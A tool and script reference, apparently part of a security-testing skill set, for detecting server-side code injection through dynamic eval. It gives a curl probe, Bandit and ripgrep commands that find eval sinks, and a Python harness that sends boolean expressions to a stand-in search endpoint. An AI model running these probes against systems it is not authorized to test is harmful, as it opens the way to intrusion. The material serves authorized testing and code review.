# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`code-injection-and-eval-dynamic-language-eval`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `curl` | `curl -sS 'https://target.example/search' -H 'Content-Type: application/json' --data '{"filter":"len(\'dyneval\')==7"}'` | Send the true-branch expression and read whether the row set tracks the boolean | Cross-platform |
| `Bandit` | `bandit -r . -t B307` | Flag Python use-of-eval findings (B307) across the interpreted codebase before runtime probing | Linux, macOS, Windows |
| `ripgrep` | `rg -n -e "\beval\s*\(" -e "\bexec\s*\(" -e "\binstance_eval\s*\(" -e "new Function(" -t py -t ruby -t js` | Inventory interpreter eval sinks across Python, Ruby, and Node source trees | Cross-platform |

## Minimal Script Shape

A boolean-differential harness: it posts a true expression and a false expression to the filter endpoint and reports whether the response size tracks the truth value, which only an interpreter eval would do.

```python
import json
import urllib.request

ENDPOINT = "https://target.example/search"

def query(expr):
    data = json.dumps({"filter": expr}).encode()
    req = urllib.request.Request(ENDPOINT, data=data,
                                 headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=10) as r:
        return len(r.read())

true_len = query("len('dyneval')==7")
false_len = query("len('dyneval')==1")
# A size split proves the filter string is interpreted, not compared as a literal
print({"true_branch": true_len, "false_branch": false_len,
       "interpreter_eval_reachable": true_len != false_len})
```
